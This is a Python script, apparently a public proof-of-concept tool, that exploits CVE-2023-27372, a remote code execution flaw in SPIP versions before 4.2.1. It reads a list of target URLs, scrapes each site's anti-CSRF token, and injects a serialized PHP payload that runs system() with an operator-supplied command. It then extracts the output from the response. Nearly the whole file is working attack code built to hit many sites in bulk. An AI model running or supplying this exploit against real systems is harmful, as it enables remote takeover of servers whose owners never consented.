# Author: Pari Malam

import argparse
import bs4
import os
import requests
import ssl
import urllib3
import random
import html
from sys import stdout
from colorama import Fore, Style

FY = Fore.YELLOW
FG = Fore.GREEN
FR = Fore.RED
FC = Fore.CYAN
FW = Fore.WHITE

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def dirdar():
    if not os.path.exists('Results'):
        os.mkdir('Results')
dirdar()

def banners():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n")
    print(f"{FY}[CVE-2023-27372] - {FG}SPIP Remote Code Execution (4.2.1)\n{Style.RESET_ALL}")
banners()

def users_agents():
    with open("lib/ua.txt", "r") as ua_file:
        user_agents = ua_file.readlines()
    user_agents = [ua.strip() for ua in user_agents if ua.strip()]
    return user_agents

def parse_args():
    parser = argparse.ArgumentParser(description="Poc of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution")
    parser.add_argument("-f", "--filename", default=None, required=True, help="File containing multiple URLs")
    parser.add_argument("-c", "--command", default=None, required=True, help="Command to execute")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
    parser.add_argument("-o", "--output", default=None, help="Output file to save the response text")
    return parser.parse_args()

def get_anticsrf(url, session):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        headers = {
            'User-Agent': random.choice(users_agents())
        }

        r = session.get('%s/spip.php?page=spip_pass' % url, headers=headers, timeout=10, verify=False)
        r.raise_for_status()
        soup = bs4.BeautifulSoup(r.text, 'html.parser')
        csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
        if csrf_input:
            csrf_value = csrf_input['value']
            if options.verbose:
                print(f"{FY}[CVE-2023-27372] - {FW}{url} - {FG}[w00t] - {FW}Anti-CSRF Token: {FC}{csrf_value}")
            return csrf_value
        else:
            print(f"{FY}[CVE-2023-27372] - {FW}{url} - {FR}[Failed] - Unable to find Anti-CSRF Token")
            return None
    except requests.exceptions.RequestException as e:
        print(f"{FY}[CVE-2023-27372] - {FW}{url} - {FR}[Failed] - An error occurred while accessing URL")
        # print("Error message:", str(e))
        return None

def send_payload(url, payload, csrf, session):
    try:
        data = {
            "page": "spip_pass",
            "formulaire_action": "oubli",
            "formulaire_action_args": csrf,
            "oubli": payload
        }

        headers = {
            'User-Agent': random.choice(users_agents())
        }

        r = session.post('%s/spip.php?page=spip_pass' % url, headers=headers, data=data, timeout=10, verify=False)
        r.raise_for_status()

        output_folder = "Results"
        os.makedirs(output_folder, exist_ok=True)

        if options.output:
            output_folder = "Results"
            os.makedirs(output_folder, exist_ok=True)
            output_file_path = os.path.join(output_folder, options.output)
            with open(output_file_path, 'a', encoding='utf-8') as output_file:
                output_file.write(f"{url}/spip.php?page=spip_pass\n\n")
                output_file.write(r.text + '\n\n')

        if options.verbose:
            print(f"{FY}[CVE-2023-27372] - {FW}{url}/spip.php?page=spip_pass - {FG}Executed Payload - {FC}{payload}")
            print(f"{FY}[CVE-2023-27372] - {FW}{url} - {FG}Response text: {r.text}")

            if options.output:
                with open(output_file_path, 'a', encoding='utf-8') as output_file:
                    output_file.write(f"{url}/spip.php?page=spip_pass\n\n")
                    output_file.write(r.text + '\n\n')

        soup = bs4.BeautifulSoup(r.text, 'html.parser')
        oubli_input = soup.find('input', {'name': 'oubli', 'type': 'text'})
        if oubli_input:
            value = oubli_input['value']
            print(f"{FY}[CVE-2023-27372] - {FG}Extracted Value - {FC}{value}")
        else:
            print(f"{FY}[CVE-2023-27372] - {FR}[Failed] - Unable to find the oubli value, try check in manual.")

        return 0
    except requests.exceptions.RequestException as e:
        print(f"{FY}[CVE-2023-27372] - {FW}{url} - {FR}[Failed] - An error occurred while sending payloads")
        # print("Error message:", str(e))
        return -1

if __name__ == '__main__':
    options = parse_args()

    with open(options.filename, 'r') as file:
        urls = [line.strip() for line in file]

    urls = [url if url.startswith(('http://', 'https://')) else 'http://' + url for url in urls]

    urllib3.disable_warnings()

    ssl_context = ssl.create_default_context()
    ssl_context.set_ciphers(':HIGH:!DH:!aNULL')

    try:
        urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    except AttributeError:
        pass

    session = requests.Session()

    for url in urls:
        csrf = get_anticsrf(url, session)
        if csrf is not None:
            send_payload(url, payload=f"s:%s:\"<?php system('{options.command}'); ?>\";" % (20 + len(options.command)), csrf=csrf, session=session)
